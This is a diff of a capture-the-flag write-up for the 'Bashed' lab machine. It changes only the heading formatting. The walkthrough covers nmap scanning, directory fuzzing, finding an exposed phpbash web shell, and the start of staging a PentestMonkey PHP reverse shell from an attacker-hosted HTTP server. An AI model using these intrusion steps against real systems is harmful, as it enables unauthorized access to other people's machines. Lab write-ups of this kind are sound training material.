@@ -1,11 +1,11 @@
 ***Description***: Bashed is an easy Linux machine focused on web fuzzing and locating exposed development files. After discovering a functional phpbash instance, access is gained as `www-data` and escalated to `scriptmanager` through sudo permissions. As direct crontab access is restricted, root escalation relies on identifying writable scripts executed by a root-owned scheduled task.
 
-***Used Tools:
+***Used Tools***:
 - Nmap
 - BurpSuite
 
 
-***Enumeration/ Port Scanning:
+***Enumeration/ Port Scanning***:
 		After receiving the ip address, I ran a port scan using nmap. That's useful for detecting open ports.
 			1. nmap -sS  -T4 machine_ip
 				1.1 -sS is for nmap use just TCP SYN to scan, and not to the complete three-way-handshake (That's quieter and fast)
@@ -21,7 +21,7 @@
 				3.2 -w is to indicate the wordlist
 				3.3 Response: uploads   [Status: 200]  - dev    [Status: 200]  - php  [Status: 200] 
 
-***Exploitation 
+***Exploitation***
 		Exploring the /dev/ directory, i found a php bash in /dev/phpbash.php (www-data@bashed:/var/www/html/dev#).  After that, to estabilished a reverse shell, i use php revshell from PentestMonkey. 
 			1. python -m http.server 8081 (on my machine)
 				1. That´s to up a http server to the target machine download  the phprevshell.php
